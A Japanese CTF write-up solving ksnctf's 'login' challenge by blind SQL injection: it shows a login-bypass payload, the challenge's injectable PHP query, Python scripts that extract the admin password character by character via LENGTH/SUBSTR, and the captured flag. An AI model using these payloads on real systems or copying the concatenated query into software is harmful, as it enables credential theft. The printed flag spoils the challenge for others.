--- 
title: "ksnctf login write-up" 
emoji: "📝" 
type: "tech" 
topics: ["ctf", "crypto"] 
published: true
--- 

みなさん、こんにちは。 cork（コルク）です。 
セキュリティの勉強としてctfをやっていますが、記録のためにwrite-upを書いていこうと思います。 

# login (120 points) 

## 概要 
有名な常設CTFである[ksnctf](https://ksnctf.sweetduet.info/)の[第6問](https://ksnctf.sweetduet.info/problem/6)の解説です。 
ネタバレするとBlind SQL Injectionの問題です。

## 問題 
以下のURLが与えられます。
[http://ctfq.u1tramarine.blue/q6/](http://ctfq.u1tramarine.blue/q6/)
[https://ctfq.u1tramarine.blue/q6/](https://ctfq.u1tramarine.blue/q6/)

## 解説
まず、リンクにアクセスしてみるとログイン画面が出るとともに`First, login as "admin".`と書かれているのでSQLインジェクションかなと思い、とりあえずログインしてみます。

![](https://storage.googleapis.com/zenn-user-upload/b7e737addfbc-20211210.png =250x)*login page* 

**ID**に"admin"、**Pass**に"1' or '1' = '1';--"を入力してログインしたところ以下のページが表示されました。

```
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

Hint:
<?php
    function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}
    
    $id = isset($_POST['id']) ? $_POST['id'] : '';
    $pass = isset($_POST['pass']) ? $_POST['pass'] : '';
    $login = false;
    $err = '';
    
    if ($id!=='')
    {
        $db = new PDO('sqlite:database.db');
        $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
        $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
        $login = $r && $r->fetch();
        if (!$login)
            $err = 'Login Failed';
    }
?><!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```

どうやらログインするだけではフラグは取れず、adminのパスワードがフラグになっておりそれを見つけないといけないそうです。

とりあえず、パスワードを総当たりで探そうと思います。
SQLの知識は学校で習った程度だったので、LIKEを用いて1文字ずつ探したらいけそうかなと思ったのでpythonでプログラムを組んで総当たりで探しました。

上記のページを見ている感じはPOSTが使われてそうなので、pythonのrequestsを使ってidとpassを送信して、`Congratulations!`を含む文字列が返されたかを判定することでログインに成功したかを判定しています。
また、パスワードの候補となる文字についてはASCIIコードなどを使うのが面倒だったので、`printable characters python`とGoogleで検索して出てくる[このページ](https://stackoverflow.com/questions/5891453/how-do-i-get-a-list-of-all-the-ascii-characters-using-python)に書いてる文字列にちょっと変更を加えたものを使用しています。（友達に教えてもらいました。）

※SQLおよびpythonに対しての知識がほぼ皆無に等しい状況でコードを書いたので、クソコードになっています。**参考にしないでください**。

```python
import requests

def is_correct_pw(pw:str):
    url = "http://ctfq.u1tramarine.blue/q6/"
    login = {
        'id': "admin",
        'pass': f"' LIKE '{pw}%'--"
    }
    r = requests.post(url, data=login)
    return ('Congratulations!' in r.text)

password = ""
for i in range(30):
    for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[\]^_`{|}~":
        if(is_correct_pw(password + c)):
            password += c
            break
print(password)
```

見ていただいたようにSQL文がかなりぐちゃぐちゃだったため、全然特定ができませんでした。

そこでとりあえずSQLについてしっかりと理解した上でパスワードの長さだけでも解りたいということでコードを書きました。




```python
import requests

# パスワードの長さの推測
password_length  = 1
for i in range(100):
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
    login = {
        'id': sql,
        'pass': "aaa"
    }
    r = requests.post(url, data=login)
    if('Congratulations!' in r.text):
        print("length of admin's password is",i)
        password_length = i
        break
```

この結果、パスワードの長さが21であることがわかりました。
次にどうすればパスワードがわかるかなと思って色々調べているとSQLに**SUBSTR**というものがあることがわかりました。
これは文字列から任意の長さの文字列を切り出せるものでSUBSTRを用いてパスワードを1文字ずつ切り出して、それがどの文字と一致するかを調べるコードを書きました。

```python
import requests

# パスワードの長さの推測
password_length  = 1
for i in range(100):
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND (SELECT LENGTH(pass) FROM user WHERE id = 'admin') = {i} --"
    login = {
        'id': sql,
        'pass': "aaa"
    }
    r = requests.post(url, data=login)
    if('Congratulations!' in r.text):
        print("length of admin's password is",i)
        password_length = i
        break

# password全探索の前処理
def is_correct_pw(i:int,pw:str)->bool:
    url = "http://ctfq.u1tramarine.blue/q6/"
    sql = f"admin' AND SUBSTR((SELECT pass FROM user WHERE id = 'admin'), {i}, 1) = '{pw}' --"
    login = {
        'id': sql,
        'pass': ""
    }
    r = requests.post(url, data=login)
    return ('Congratulations!' in r.text)

# passwordの全探索
password = ""
for i in range(1,password_length + 1):
    for c in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&()*+,-./:;<=>?@[\]^_`{|}~":
        if(is_correct_pw(i,c)): 
           password += c
           print(password)
           break
print("admin's password is",password)
```

この結果、FLAGがゲットできました。
```
FLAG_KpWa4ji3uZk6TrPK
```
